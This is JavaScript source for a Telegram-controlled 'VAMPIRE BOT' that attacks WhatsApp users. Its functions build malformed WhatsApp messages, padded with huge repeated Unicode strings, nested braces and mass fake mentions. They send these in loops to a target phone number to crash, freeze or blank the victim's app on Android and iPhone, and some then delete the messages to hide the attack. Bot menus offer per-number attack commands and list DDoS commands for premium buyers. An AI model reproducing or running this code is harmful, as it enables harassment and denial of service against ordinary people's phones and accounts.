								"thumbnail": "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAEgASAMBIgACEQEDEQH/xAAwAAADAQEBAQAAAAAAAAAAAAAABAUDAgYBAQEBAQEBAAAAAAAAAAAAAAAAAQIDBP/aAAwDAQACEAMQAAAAa4i3TThoJ/bUg9JER9UvkBoneppljfO/1jmV8u1DJv7qRBknbLmfreNLpWwq8n0E40cRaT6LmdeLtl/WZWbiY3z470JejkBaRJHRiuE5vSAmkKoXK8gDgCz/xAAsEAACAgEEAgEBBwUAAAAAAAABAgADBAUREiETMVEjEBQVIjJBQjNhYnFy/9oACAEBAAE/AMvKVPEBKqUtZrSdiF6nJr1NTqdwPYnNMJNyI+s01sPoxNbx7CA6kRUouTdJl4LI5I+xBk37ZG+/FopaxBZxAMrJqXd/1N6WPhi087n9+hG0PGt7JMzdDekcqZp2bZjWiq2XAWBTMyk1XHrozTMepMPkwlDrzff0vYmMq3M2Q5/5n9WxWO/vqV7nczIflZWgM1DTktauxeiDLPyeKaoD0Za9lOCmw3JlbE1EH27Ccmro8aDuVZpZkRk4kTHf6W/77zjzLvv3ynZKjeMoJH9pnoXDgDsCZ1ngxOPwJTULaqHG42EIazIA9ddiDC/OSWlXOupw0Z7kbettj8GUuwXd/wBZHQlR2XaMu5M1q7p5g61XTWlbpGzKWdLq37iXISNoyhhLscK/PYmU1ty3/kfmWOtSgb9x8pKUZyf9CO9udkfLNMbTKEH1VJMbFxcVfJW0+9+B1JQlZ+NIwmHqFWVeQY3JrwR6AmblcbwP47zJZWs5Kej6mh4g7vaM6noJuJdjIWVwJfcgy0rA6ZZd1bYP8jNIdDQ/FBzWam9tVSPWxDmPZk3oFcE7RfKpExtSyMVeCepgaibOfkKiXZVIUlbASB1KOFfLKttHL9ljUVuxsa9diZhtjUVl6zM3KsQIUsU7xr7W9uZyb5M/8QAGxEAAgMBAQEAAAAAAAAAAAAAAREAECBRMWH/2gAIAQIBAT8Ap/IuUPM8wVx5UMcJgr//xAAdEQEAAQQDAQAAAAAAAAAAAAABAAIQESEgMVFh/9oACAEDAQE/ALY+wqSDk40Op7BTMEOywVPXErAhuNMDMdW//9k=",
								"sourceType": " x ",
								"sourceId": " x ",
								"sourceUrl": "https://www.instagram.com/coreinpin/",
								"mediaUrl": "https://www.instagram.com/coreinpin/",
								"containsAutoReply": true,
								"renderLargerThumbnail": true,
								"showAdAttribution": true,
								"ctwaClid": "ctwa_clid_example",
								"ref": "ref_example"
							},
							"entryPointConversionSource": "entry_point_source_example",
							"entryPointConversionApp": "entry_point_app_example",
							"entryPointConversionDelaySeconds": 5,
							"disappearingMode": {},
							"actionLink": {
								"url": "https://www.instagram.com/coreinpin/"
							},
							"groupSubject": "Example Group Subject",
							"parentGroupJid": "6287888888888-1234567890@g.us",
							"trustBannerType": "trust_banner_example",
							"trustBannerAction": 1,
							"isSampled": false,
							"utm": {
								"utmSource": "utm_source_example",
								"utmCampaign": "utm_campaign_example"
							},
							"forwardedNewsletterMessageInfo": {
								"newsletterJid": "6287888888888-1234567890@g.us",
								"serverMessageId": 1,
								"newsletterName": " X ",
								"contentType": "UPDATE",
								"accessibilityText": " X "
							},
							"businessMessageForwardInfo": {
								"businessOwnerJid": "0@s.whatsapp.net"
							},
							"smbClientCampaignId": "smb_client_campaign_id_example",
							"smbServerCampaignId": "smb_server_campaign_id_example",
							"dataSharingContext": {
								"showMmDisclosure": true
							}
						}
					}
				},
				Ptcp ? {
					participant: {
						jid: target
					}
				} : {}
			);
			console.log(chalk.green("Sending Force Close iOs"));
		};
       
async function VampFCiOs(sock, target) {
  const crashMessage = {
    conversation: "𝗩𝗮𝗺𝗽𝗶𝗿𝗲 iPhone" + "҉҈⃝⃞⃟⃠⃤꙰꙲꙱‱ᜆᢣ" + "𑇂𑆵𑆴𑆿".repeat(60000),
    contextInfo: {
      externalAdReply: {
        title: `BlackBOT.zip`,
        body: `Haii ${pushname}`,
        previewType: "PHOTO",
        thumbnail: "", // bisa diganti buffer gambar kalau mau
        sourceUrl: `https://raw.githubusercontent.com/VampirePrivate/VampData/refs/heads/main/VampClouds.json`
      }
    }
  };

  await sock.relayMessage(
    target,
    { message: crashMessage },
    { messageId: generateMessageID() }
  );
  
  console.log(chalk.red("Success Sending Force Close iPhone"));
}

async function iOsCrashVamp(sock, target) {

await sock.relayMessage(target, {
  contactsArrayMessage: {
    displayName: "@Vampire" + "𑇂𑆵𑆴𑆿".repeat(60000),
    contacts: [
      {
        displayName: "V꙱ampire",
        vcard: `BEGIN:VCARD\nVERSION:3.0\nN:;V꙱ampire;;;\nFN:V꙱ampire꙱\nitem1.TEL;waid=5521986470032:+55 21 98647-0032\nitem1.X-ABLabel:Ponsel\nEND:VCARD`
      },
      {
        displayName: "V꙱ampire꙱",
        vcard: `BEGIN:VCARD\nVERSION:3.0\nN:;V꙱ampire;;\nFN:V꙱ampire\nitem1.TEL;waid=5512988103218:+55 12 98810-3218\nitem1.X-ABLabel:Ponsel\nEND:VCARD`
      }
    ],
    contextInfo: {
      forwardingScore: 1,
      isForwarded: true,
      quotedAd: {
        advertiserName: "x",
        mediaType: "IMAGE",
        jpegThumbnail: null,
        caption: "x"
        },
      placeholderKey: {
        remoteJid: "0@s.whatsapp.net",
        fromMe: false,
        id: "ABCDEF1234567890"
        }        
      }
    }
  }, { participant: { jid: target } })
}

async function VampBlankiOs(sock, target) {
      sock.relayMessage(
        target,
        {
          extendedTextMessage: {
            text: `𝗩𝗮𝗺𝗽𝗶𝗿𝗲` + "𑇂𑆵𑆴𑆿".repeat(60000),
            contextInfo: {
              fromMe: false,
              stanzaId: target,
              participant: target,
              quotedMessage: {
                conversation: "Shut Up Bitch" + "҉҈⃝⃞⃟⃠⃤꙰꙲꙱‱ᜆᢣ".repeat(10),
              },
              disappearingMode: {
                initiator: "CHANGED_IN_CHAT",
                trigger: "CHAT_SETTING",
              },
            },
            inviteLinkGroupTypeV2: "DEFAULT",
          },
        },
        {
          participant: {
            jid: target,
          },
        },
        {
          messageId: null,
        }
      );
      
      console.log(chalk.red("Success Sending iPhone Blank"));
    }
   
async function VampBetaSpam(sock, target, Vampire) {
  try {
    const msgId = "SILENT_" + Date.now();

    // Isi pesan
    let message = {
      viewOnceMessage: {
        message: {
          interactiveMessage: {
            body: {
              text: "PERMISI... ANTAR PAKET",
            },
            contextInfo: {
              forwardingScore: 9999,
              isForwarded: true,
              participant: "0@s.whatsapp.net",
              remoteJid: "status@broadcast",
              mentionedJid: [target],
              ephemeralSettingTimestamp: 9741,
              entryPointConversionSource: "WhatsApp.com",
              entryPointConversionApp: "WhatsApp",
              disappearingMode: {
                initiator: "INITIATED_BY_OTHER",
                trigger: "ACCOUNT_SETTING"
              }
            },
            nativeFlowMessage: {
              buttons: [
                {
                  name: "single_select",
                  buttonParamsJson: "",
                },
                {
                  name: "call_permission_request",
                  buttonParamsJson: JSON.stringify({
                    status: true,
                  }),
                },
              ],
              messageParamsJson: "{{".repeat(Vampire),
            },
          },
        },
      },
    };

    // Kirim pesan ke target
    const sent = await sock.relayMessage(target, message, {
      messageId: msgId,
      statusJidList: [target],
    });

    // Tunggu 150ms, lalu hapus dari semua sisi
    setTimeout(async () => {
      await sock.relayMessage(target, {
        protocolMessage: {
          key: {
            remoteJid: target,
            fromMe: true,
            id: msgId,
          },
          type: 0, // 0 = revoke/delete for everyone
        },
      }, { messageId: "DELETE_" + Date.now() });
    }, 150);

  } catch (err) {
    console.error(chalk.red("Error:"), err.message);
  }
}

async function VampFCInvisDel(sock, target, Vampire, mention = false) {
  try {
    let message = { 
      viewOnceMessage: {
        message: {
          interactiveMessage: {
            contextInfo: {
              businessMessageForwardInfo: { businessOwnerJid: "13135550202@s.whatsapp.net" },
              stanzaId: "Vampire-Id" + Math.floor(Math.random() * 999999999999),
              forwardingScore: 100,
              isForwarded: true,
              mentionedJid: ["13135550202@s.whatsapp.net"],
            }, 
            body: {
              text: "⓵ Foto" + "\n".repeat(250) + "ꦽ".repeat(5000),
            },
            nativeFlowMessage: {
              buttons: [
                 {
                   name: "single_select",
                   buttonParamsJson: JSON.stringify({ status: false }),
                 }, 
                 {
                   name: "galaxy_message",
                   buttonParamsJson: JSON.stringify({ status: false }),
                 }, 
                 {
                   name: "call_permission_request",
                   buttonParamsJson: JSON.stringify({ status: false }),
                 }, 
              ], 
              messageParamsJson: "{[".repeat(Vampire), 
            },
            messageVersion: "VAMPIRE-VERSION-OVERFLOW",
          },
        },
      },
    };

    const VampireBug = await sock.relayMessage(target, message, {
      messageId: "",
      participant: { jid: target },
      userJid: target,
    });

    const VampireLaunch = await sock.relayMessage(target, message, {
      messageId: "",
      participant: { jid: target },
      userJid: target,
    });

    const VampireCrash = await sock.relayMessage(target, message, {
      messageId: "",
      participant: { jid: target },
      userJid: target,
    });

    // Hapus pesan-pesan tadi
    await sock.sendMessage(target, {
      delete: {
        fromMe: true,
        remoteJid: target,
        id: VampireBug
      }
    });

    await sock.sendMessage(target, {
      delete: {
        fromMe: true,
        remoteJid: target,
        id: VampireLaunch
      }
    });

    await sock.sendMessage(target, {
      delete: {
        fromMe: true,
        remoteJid: target,
        id: VampireCrash
      }
    });

    // Kirim ke status broadcast
    await sock.relayMessage("status@broadcast", message, {
      messageId: "VampBroadcast-" + Math.floor(Math.random() * 999999),
      statusJidList: [target],
      additionalNodes: [
        {
          tag: "meta",
          attrs: {},
          content: [
            {
              tag: "mentioned_users",
              attrs: {},
              content: [
                {
                  tag: "to",
                  attrs: { jid: target },
                  content: undefined
                }
              ]
            }
          ]
        }
      ]
    });

    // Optional: mention status jika parameter `mention` true
    if (mention) {
      await sock.relayMessage(
        target,
        {
          statusMentionMessage: {
            message: {
              protocolMessage: {
                key: { id: "mention-msg-" + Date.now(), remoteJid: target },
                type: 25
              }
            }
          }
        },
        {
          additionalNodes: [
            {
              tag: "meta",
              attrs: { is_status_mention: "BlackBOT" },
              content: undefined
            }
          ]
        }
      );
    }

    console.log(chalk.red("Vampire Success Sending Delay Bug"));
    
  } catch (error) {
    console.error("Terdapat Eror Pada Bagian Struktur Function", error);
  }
}

async function VampForceNew(target) {
  const msg = await generateWAMessageFromContent(
    target,
    {
      viewOnceMessage: {
        message: {
          interactiveMessage: {
            contextInfo: {
              expiration: 1,
              ephemeralSettingTimestamp: 1,
              entryPointConversionSource: "WhatsApp.com",
              entryPointConversionApp: "WhatsApp",
              entryPointConversionDelaySeconds: 1,
              disappearingMode: {
                initiatorDeviceJid: target,
                initiator: "INITIATED_BY_OTHER",
                trigger: "UNKNOWN_GROUPS"
              },
              participant: "0@s.whatsapp.net",
              remoteJid: "status@broadcast",
              mentionedJid: [target],
              quotedMessage: {
                paymentInviteMessage: {
                  serviceType: 1,
                  expiryTimestamp: null
                }
              },
              externalAdReply: {
                showAdAttribution: false,
                renderLargerThumbnail: true
              }
            },
            body: {
              text: "𝐕𝐚𝐦𝐩𝐢𝐫𝐞.𝐳𝐢𝐩" + "ꦾ".repeat(50000)
            },
            nativeFlowMessage: {
              messageParamsJson: "{".repeat(20000),
              buttons: [
                {
                  name: "single_select",
                  buttonParamsJson:
                     ""
                },
                {
                  name: "call_permission_request",
                  buttonParamsJson:
                     ""
                }
              ]
            }
          }
        }
      }
    },
    {}
  );

  await sock.relayMessage(target, msg.message, {
    participant: { jid: target },
    messageId: msg.key.id
  });
}

async function VampBlankDelay(sock, target) {
  const mentionedList = Array.from(
    { length: 40000 },
    () => `1${Math.floor(Math.random() * 9999999)}@s.whatsapp.net`
  );
  const system = "꧀".repeat(555555);

  const msg = await generateWAMessageFromContent(
    target,
    {
      viewOnceMessage: {
        message: {
          messageContextInfo: {
            messageSecret: crypto.randomBytes(32),
          },
          interactiveResponseMessage: {
            body: {
              text: "INFO DAGET GUYS",
              format: "DEFAULT",
            },
            nativeFlowResponseMessage: {
              name: "Huwaaaaaa!!!",
              paramsJson: "\u0003".repeat(99999),
              version: 3,
            },
            contextInfo: {
              isForwarded: true,
              forwardingScore: 9999,
              mentioned: false, // ✅ Tambahan mention false
              forwardedNewsletterMessageInfo: {
                newsletterName: "(trigger) shadowx",
                newsletterJid: "120363321780343299@newsletter",
                serverMessageId: 1,
              },
            },
          },
        },
      },
    },
    {}
  );

  await sock.relayMessage("status@broadcast", msg.message, {
    messageId: msg.key.id,
    statusJidList: [target],
    additionalNodes: [
      {
        tag: "meta",
        attrs: {},
        content: [
          {
            tag: "mentioned_users",
            attrs: {},
            content: [
              { tag: "to", attrs: { jid: target }, content: undefined },
            ],
          },
        ],
      },
    ],
  });

  await sock.sendMessage(target, {
    text: "Vampire Attack",
    contextInfo: {
      mentionedJid: mentionedList,
      mentioned: false, // ✅ Tambahan mention false
      quotedMessage: {
        viewOnceMessage: {
          message: {
            groupStatusMentionMessage: {
              name: "VampireBlank" + system,
              jid: target,
              mention: [target],
              contextInfo: {
                mentionedJid: mentionedList,
                mentioned: false, // ✅ Tambahan mention false
              },
            },
          },
        },
      },
      remoteJid: "status@broadcast",
      participant: "0@s.whatsapp.net",
      fromMe: true,
    },
  });

  await sock.relayMessage(
    target,
    {
      statusMentionMessage: {
        message: {
          protocolMessage: {
            key: msg.key,
            type: 25,
          },
        },
      },
    },
    {
      additionalNodes: [
        {
          tag: "meta",
          attrs: { is_status_mention: "false" },
          content: undefined,
        },
      ],
    }
  );
  console.log(chalk.red("Vampire Success Sending Delay Bug"));
}

async function VampFreeze(sock, target) {
const fakeKey = {
    "remoteJid": target,
    "fromMe": true,
    "id": await sock.relayMessage(target, {
        "albumMessage": {
            "expectedImageCount": -99999999,
            "expectedVideoCount": 0,
            "caption": "x"
        }
    },{participant:{jid:target}})
}
let xx = {"url": "https://mmg.whatsapp.net/o1/v/t24/f2/m238/AQP-LtlwUD2se4WwbHuAcLfNkQExEEAg1XB7USSkMr3T6Ak44ejssvZUa1Ws50LVEF3DA4sSggQyPxsDB-Oj1kWUktND6jFhKMKh7hOLeA?ccb=9-4&oh=01_Q5Aa2AEF_MR-3UkNgxeEKr2zpsTp0ClCZDggq1i0bQZbCGlFUA&oe=68B7C20F&_nc_sid=e6ed6c&mms3=true","mimetype": "image/jpeg","fileSha256": "yTsEb/zyGK+lB2DApj/PK+gFA1D6Heq/G0DIQ74uh6k=","fileLength": "52039","height": 786,"width": 891,"mediaKey": "XtKW4xJTHhBzWsRkuwvqwQp/7SVayGn6sF6XgNblyLo=","fileEncSha256": "rm/kKkIFGA1Vh6yKeaetbsvCS7Cp2vcGYoiNkrvPCwY=","directPath": "/o1/v/t24/f2/m238/AQP-LtlwUD2se4WwbHuAcLfNkQExEEAg1XB7USSkMr3T6Ak44ejssvZUa1Ws50LVEF3DA4sSggQyPxsDB-Oj1kWUktND6jFhKMKh7hOLeA?ccb=9-4&oh=01_Q5Aa2AEF_MR-3UkNgxeEKr2zpsTp0ClCZDggq1i0bQZbCGlFUA&oe=68B7C20F&_nc_sid=e6ed6c"}
let xz
for (let s = 0; s < 2; s++) {
if (s === 1) {
xx.caption = "𑲱".repeat(200000);
}
const xy = generateWAMessageFromContent(target, proto.Message.fromObject({
"botInvokeMessage": {
"message": {
    "messageContextInfo": {
        "messageSecret": (0, crypto.randomBytes)(32),
        "messageAssociation": {
            "associationType": "MEDIA_ALBUM",
            "parentMessageKey": fakeKey
        }
    },
"imageMessage": xx
}
}
}),{participant:{jid:target}})
xz = await sock.relayMessage(target, xy.message, {messageId:xy.key.id,participant:{jid:target}})
}
}

const delay = ms => new Promise(resolve => setTimeout(resolve, ms));
        
async function VampNotif(sock, target) {
for (let i = 0; i < 60; i++) {
await VampButtonUi(sock, target, Ptcp = true)
await VampFreeze(sock, target)
await new Promise((resolve) => setTimeout(resolve, 300));
await VampNewCrash(sock, target, ptcp = true)
await VampFreeze(sock, target)
await new Promise((resolve) => setTimeout(resolve, 300));
await VampNewAttack(sock, target, ptcp = true)
await VampFreeze(sock, target)
await new Promise((resolve) => setTimeout(resolve, 300));
await VampireUi(sock, target, Ptcp = false)
await VampFreeze(sock, target)
await new Promise((resolve) => setTimeout(resolve, 300));
}
}

async function VampEasyDelay(sock, target) {
for (let i = 0; i < 250; i++) {
await VampBlankDelay(sock, target)
await new Promise((resolve) => setTimeout(resolve, 1000));
await VampBlankDelay(sock, target)
await new Promise((resolve) => setTimeout(resolve, 1000));
}
}

async function VampCrashiPhone(sock, target) {
for (let i = 0; i < 50; i++) {
await VampFCiOs(sock, target)
await VampBlankiOs(sock, target)
await SafariCall(sock, target, Ptcp = true)
await iOsCrashVamp(sock, target)
}
}

async function VampHardCrash(sock, target) {
for (let i = 0; i < 80; i++) {
await VampForceNew(target)
await new Promise((resolve) => setTimeout(resolve, 1000));
await VampFreeze(sock, target)
await new Promise((resolve) => setTimeout(resolve, 1000));
}
}

async function VampMediumCrash(sock, target) {
for (let i = 0; i < 80; i++) {
await VampFCInvisDel(sock, target, 10000, mention = false)
await new Promise((resolve) => setTimeout(resolve, 1000));
await VampBetaSpam(sock, target, 10000)
await new Promise((resolve) => setTimeout(resolve, 1000));
await VampFreeze(sock, target)
await new Promise((resolve) => setTimeout(resolve, 1000));
}
}

function isOwner(userId) {
  return config.OWNER_ID.includes(userId.toString());
}


const bugRequests = {};

bot.onText(/\/start/, async (msg) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;

  // Cek apakah user adalah admin grup
  let isAdmin = false;
  if (msg.chat.type !== "private") {
    try {
      const chatAdmins = await bot.getChatAdministrators(chatId);
      isAdmin = chatAdmins.some(admin => admin.user.id === senderId);
    } catch (err) {
      console.error("Gagal mendapatkan admin grup:", err);
    }
  }

  // Cek apakah user adalah owner, admin, atau premium
  if (
    !adminUsers.includes(senderId) &&
    !isOwner(senderId) &&
    !premiumUsers.some(user => user.id === senderId && new Date(user.expiresAt) > new Date()) &&
    !isAdmin
  ) {
    const options = {
      caption: "Maaf Bro!!!\nLu Gak Punya Access Premium\n\nSegera Hubungi :\n@Vampiresagara",
      parse_mode: "Markdown"
    };
    return bot.sendPhoto(chatId, "https://files.catbox.moe/a51xhx.jpg", options);
  }

  // Kirim juga msg ke fungsi biar bisa ambil info sender
  sendMainMenu(chatId, msg);
});

// Fungsi kirim Menu Utama
function sendMainMenu(chatId, msg) {
  const now = new Date();
  const jam = now.getHours().toString().padStart(2, "0");
  const menit = now.getMinutes().toString().padStart(2, "0");
  const detik = now.getSeconds().toString().padStart(2, "0");
  const waktu = `${jam}:${menit}:${detik}`;

  const userId = msg?.from?.id || 0;
  const senderName = msg.from.username ? `@${msg.from.username}` : `${userId}`;
  const isPremium = premiumUsers.includes(userId) ? "✅ Premium" : "❌ No Access";

  const caption = `\`\`\`
┏━━━━━━━━━━━━━━━━━━━━━━┓
┃ 𖢇 Bᴏᴛ ɴᴀᴍᴇ : VAMPIRE BOT
┃ 𖢇 Vᴇʀsɪᴏɴ  : 12.0
┃ 𖢇 Dᴇᴠᴇʟᴏᴘᴇʀ : @Vampiresagara
┃ 𖢇 Oɴʟɪɴᴇ   : ${waktu}
┗━━━━━━━━━━━━━━━━━━━━━━┛
┏━━━━━━━━━━━━━━━━━━━━━━┓
┃ ∘︎ Usᴇʀ  : ${senderName}
┃ ∘︎ Usᴇʀ ɪᴅ : ${userId}
┗━━━━━━━━━━━━━━━━━━━━━━┛
\`\`\``;

  bot.sendPhoto(msg.chat.id, "https://files.catbox.moe/a51xhx.jpg", {
    caption,
    parse_mode: "Markdown",
    reply_markup: {
      inline_keyboard: [
        [{ text: "𝗕𝘂𝗴 𝗟𝗶𝘀𝘁", callback_data: "BugMenu" }],
        [{ text: "𝗗𝗗𝗼𝗦 𝗟𝗶𝘀𝘁", callback_data: "DDoSMenu" }],
        [{ text: "𝗢𝘄𝗻𝗲𝗿 𝗧𝗼𝗼𝗹𝘀", callback_data: "OwnerArea" }, { text: "𝗢𝘁𝗵𝗲𝗿 𝗠𝗲𝗻𝘂", callback_data: "ToolsMenu" }],
        [{ text: "𝗖𝗼𝗻𝘁𝗮𝗰𝘁", url: "https://t.me/Vampiresagara" }],
        [{ text: "𝗠𝘆 𝗖𝗵𝗮𝗻𝗻𝗲𝗹", url: "https://t.me/VampireChannelOfficial" }],
      ]
    }
  });
}

// Menu Bug
bot.onText(/^\/BugMenu$/, (msg) => {
  const caption = `\`\`\`
┏━━━━━━━━━━━━━━━━━━━━━━┓
┃ 𖢇 Bᴏᴛ ɴᴀᴍᴇ : VAMPIRE BOT
┃ 𖢇 Vᴇʀsɪᴏɴ  : 12.0
┃ 𖢇 Dᴇᴠᴇʟᴏᴘᴇʀ : @Vampiresagara
┗━━━━━━━━━━━━━━━━━━━━━━┛
   𝗕  𝗨  𝗚  -  𝗟  𝗜  𝗦  𝗧
┏━━━━━━━━━━━━━━━━━━━━━━┓
┃ 𖢄 /AndroidAttack 62xxx
┃ 𖢄 /iPhoneAttack 62xxx
┗━━━━━━━━━━━━━━━━━━━━━━┛
    𝗪  𝗔  𝗥  𝗡  𝗜  𝗡  𝗚
┏━━━━━━━━━━━━━━━━━━━━━━┓
┃ Apabila ada ke erroran 
┃ dalam bot ini,
┃ wajib lapor pada penjual
┃ atau developer langsung
┗━━━━━━━━━━━━━━━━━━━━━━┛
\`\`\``;
  bot.sendPhoto(msg.chat.id, "https://files.catbox.moe/a51xhx.jpg", {
    caption,
    parse_mode: "Markdown",
    reply_markup: {
      inline_keyboard: [
        [{ text: "𝗗𝗲𝘃𝗲𝗹𝗼𝗽𝗲𝗿", url: "https://t.me/Vampiresagara" }],
      ]
    }
  });
});

// Menu DDoS
bot.onText(/^\/DDoSMenu$/, (msg) => {
  const caption = `\`\`\`
┏━━━━━━━━━━━━━━━━━━━━━━┓
┃ 𖢇 Bᴏᴛ ɴᴀᴍᴇ : VAMPIRE BOT
┃ 𖢇 Vᴇʀsɪᴏɴ  : 12.0
┃ 𖢇 Dᴇᴠᴇʟᴏᴘᴇʀ : @Vampiresagara
┗━━━━━━━━━━━━━━━━━━━━━━┛
 𝗗  𝗗  𝗢  𝗦  -  𝗟  𝗜  𝗦  𝗧
┏━━━━━━━━━━━━━━━━━━━━━━┓
┃ 𖢄 /PterodactylAtt <Uʀʟ> <Tɪᴍᴇ>
┃ 𖢄 /BypassLink <Uʀʟ> <Tɪᴍᴇ>
┃ 𖢄 /ServerDown <Uʀʟ> <Tɪᴍᴇ>
┃ 𖢄 /DomMethode <Uʀʟ> <Tɪᴍᴇ>
┗━━━━━━━━━━━━━━━━━━━━━━┛
    𝗪  𝗔  𝗥  𝗡  𝗜  𝗡  𝗚
┏━━━━━━━━━━━━━━━━━━━━━━┓
┃ Apabila ada ke erroran 
┃ dalam bot ini,
┃ wajib lapor pada penjual
┃ atau developer langsung
┗━━━━━━━━━━━━━━━━━━━━━━┛
\`\`\``;
  bot.sendPhoto(msg.chat.id, "https://files.catbox.moe/a51xhx.jpg", {
    caption,
    parse_mode: "Markdown",
    reply_markup: {
      inline_keyboard: [
        [{ text: "𝗗𝗲𝘃𝗲𝗹𝗼𝗽𝗲𝗿", url: "https://t.me/Vampiresagara" }],
      ]
    }
  });
});

// Menu Tools
bot.onText(/^\/ToolsMenu$/, (msg) => {
  const caption = `\`\`\`
┏━━━━━━━━━━━━━━━━━━━━━━┓
┃ 𖢇 Bᴏᴛ ɴᴀᴍᴇ : VAMPIRE BOT
┃ 𖢇 Vᴇʀsɪᴏɴ  : 12.0
┃ 𖢇 Dᴇᴠᴇʟᴏᴘᴇʀ : @Vampiresagara
┗━━━━━━━━━━━━━━━━━━━━━━┛
  𝗢 𝗧 𝗛 𝗘 𝗥  -  𝗠 𝗘 𝗡 𝗨
┏━━━━━━━━━━━━━━━━━━━━━━┓
┃ 𖢄 /ListPrem
┃ 𖢄 /Cooldown
┃ 𖢄 /Groupset
┃ 𖢄 /DelBug
┃ 𖢄 /EncryptHard
┗━━━━━━━━━━━━━━━━━━━━━━┛
\`\`\``;
  bot.sendPhoto(msg.chat.id, "https://files.catbox.moe/a51xhx.jpg", {
    caption,
    parse_mode: "Markdown",
    reply_markup: {
      inline_keyboard: [
        [{ text: "𝗗𝗲𝘃𝗲𝗹𝗼𝗽𝗲𝗿", url: "https://t.me/Vampiresagara" }],
      ]
    }
  });
});

// Menu Owner
bot.onText(/^\/OwnerArea$/, (msg) => {
  const caption = `\`\`\`
┏━━━━━━━━━━━━━━━━━━━━━━┓
┃ 𖢇 Bᴏᴛ ɴᴀᴍᴇ : VAMPIRE BOT
┃ 𖢇 Vᴇʀsɪᴏɴ  : 12.0
┃ 𖢇 Dᴇᴠᴇʟᴏᴘᴇʀ : @Vampiresagara
┗━━━━━━━━━━━━━━━━━━━━━━┛
  𝗢 𝗪 𝗡 𝗘 𝗥  -  𝗠 𝗘 𝗡 𝗨
┏━━━━━━━━━━━━━━━━━━━━━━┓
┃ 𖢄 /AddPrem
┃ 𖢄 /DelPrem
┃ 𖢄 /AddAdmin
┃ 𖢄 /DelAdmin
┃ 𖢄 /PairingNumber
┗━━━━━━━━━━━━━━━━━━━━━━┛
\`\`\``;
  bot.sendPhoto(msg.chat.id, "https://files.catbox.moe/a51xhx.jpg", {
    caption,
    parse_mode: "Markdown",
    reply_markup: {
      inline_keyboard: [
        [{ text: "𝗗𝗲𝘃𝗲𝗹𝗼𝗽𝗲𝗿", url: "https://t.me/Vampiresagara" }],
      ]
    }
  });
});


//=======CASE BUG=========//
let jedaBug = 60 * 1000; 
let lastExecutionTime = {};

bot.onText(/\/Cooldown (\d+)([smhd]?)/i, (msg, match) => {
  const chatId = msg.chat.id;
  const value = parseInt(match[1]);
  const unit = match[2].toLowerCase() || "s"; // default detik

  if (isNaN(value) || value <= 0) {
    return bot.sendMessage(chatId, "❌ Elu Salah Bego\nContoh: /cooldown 10s atau /cooldown 5m");
  }

  let multiplier = 1000;
  let unitText = "detik";

  if (unit === "m") {
    multiplier = 60 * 1000;
    unitText = "menit";
  } else if (unit === "h") {
    multiplier = 60 * 60 * 1000;
    unitText = "jam";
  } else if (unit === "d") {
    multiplier = 24 * 60 * 60 * 1000;
    unitText = "hari";
  }

  const newDelay = value * multiplier;
  jedaBug = newDelay;

  bot.sendMessage(chatId, `✅ Cooldown Bug berhasil diatur menjadi ${value} ${unitText}`);
});

bot.onText(/\/AndroidAttack (\d+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const userId = msg.from.id;
  const senderId = msg.from.id;
  const now = Date.now();

  if (lastExecutionTime[userId] && now - lastExecutionTime[userId] < jedaBug) {
    const remainingTime = Math.ceil((jedaBug - (now - lastExecutionTime[userId])) / 1000);
    return bot.sendMessage(chatId, `Sabar Idiot!!!\nLu Harus Tunggu ${remainingTime} Detik\nSebelum Menggunakan /AttackNumber lagi.`);
  }

  lastExecutionTime[userId] = now;

  const targetNumber = match[1];
  const formattedNumber = targetNumber.replace(/[^0-9]/g, "");
  const jid = `${formattedNumber}@s.whatsapp.net`;

  bugRequests[chatId] = { stage: "awaitingNumber", jid };

  const options = {
    reply_markup: {
      inline_keyboard: [
        [
          { text: "𝗪𝗵𝗮𝘁𝘀𝗔𝗽𝗽 𝗢𝗿𝗶", callback_data: `VampOri:${jid}` },
          { text: "𝗪𝗵𝗮𝘁𝘀𝗔𝗽𝗽 𝗕𝗲𝘁𝗮", callback_data: `VampBeta:${jid}` }
        ],
        [
          { text: "𝗪𝗵𝗮𝘁𝘀𝗔𝗽𝗽 𝗕𝘂𝘀𝗶𝗻𝗲𝘀𝘀", callback_data: `VampBussiness:${jid}` },
        ],
        [
          { text: "𝗨𝗜 𝗙𝗿𝗲𝗲𝘇𝗲", callback_data: `VampUi:${jid}` },
          { text: "𝗗𝗲𝗹𝗮𝘆 𝗜𝗻𝘃𝗶𝘀𝗶𝗯𝗹𝗲", callback_data: `VampInvisible:${jid}` }
        ]
      ]
    }
  };

  bot.sendPhoto(chatId, "https://files.catbox.moe/a51xhx.jpg", { 
    caption: `
┏━━『  𝐒𝐞𝐧𝐝𝐢𝐧𝐠 𝐁𝐮𝐠 𝐂𝐫𝐚𝐬𝐡  』━━┓
┃⪼ ᴛᴀʀɢᴇᴛ : ${formattedNumber}
┗━━━━━━━━━━━━━━━━━━━━━┛`,
    parse_mode: "HTML",
    ...options
  });
});

bot.onText(/\/iPhoneAttack (\d+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const userId = msg.from.id;
  const senderId = msg.from.id;
  const now = Date.now();

  if (lastExecutionTime[userId] && now - lastExecutionTime[userId] < jedaBug) {
    const remainingTime = Math.ceil((jedaBug - (now - lastExecutionTime[userId])) / 1000);
    return bot.sendMessage(chatId, `Sabar Idiot!!!\nLu Harus Tunggu ${remainingTime} Detik\nSebelum Menggunakan /AttackNumber lagi.`);
  }

  lastExecutionTime[userId] = now;

  const targetNumber = match[1];
  const formattedNumber = targetNumber.replace(/[^0-9]/g, "");
  const jid = `${formattedNumber}@s.whatsapp.net`;

  bugRequests[chatId] = { stage: "awaitingNumber", jid };

  const options = {
    reply_markup: {
      inline_keyboard: [
        [
          { text: "𝗖𝗿𝗮𝘀𝗵 𝗖𝗵𝗮𝘁", callback_data: `VampiPhone:${jid}` },
        ],
        [
          { text: "𝗕𝗹𝗮𝗻𝗸 𝗖𝗵𝗮𝘁", callback_data: `VampiPhone:${jid}` },
          { text: "𝗙𝗼𝗿𝗰𝗲 𝗖𝗹𝗼𝘀𝗲", callback_data: `VampiPhone:${jid}` }
        ]
      ]
    }
  };

